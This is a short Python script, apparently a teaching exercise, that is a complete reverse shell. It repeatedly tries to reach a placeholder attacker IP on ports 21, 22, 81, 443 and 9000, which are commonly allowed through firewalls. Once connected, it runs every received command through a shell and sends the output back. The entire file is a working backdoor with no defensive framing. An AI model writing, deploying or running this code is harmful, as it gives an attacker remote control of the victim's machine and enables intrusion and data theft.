from __future__ import print_function
import socket
import time
import subprocess

print("started... looking for a connection...")
mysocket = socket.socket()
connected = False
while not connected:
    for port in [21, 22, 81, 443, 9000]:
        time.sleep(1)
        try:
            print("Trying", port, end=' ')
            mysocket.connect(("enter IP address here", port))
        except socket.error:
            print("Nope")
            continue
        else:
            print("Connected")
            connected = True
            break

while True:
    # set var commandrequested to mysocket.recv(1024)
    # use subprocess.Popen(to execute commandrequested)
    # Use .communicate to get all of the output and error messages
    # use mysocket.send( to send stdout and stderr )
    commandrequested=mysocket.recv(1024)
    prochandle=subprocess.Popen(commandrequested, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    results, errors= prochandle.communicate()
    results = results + errors
    mysocket.send(results)

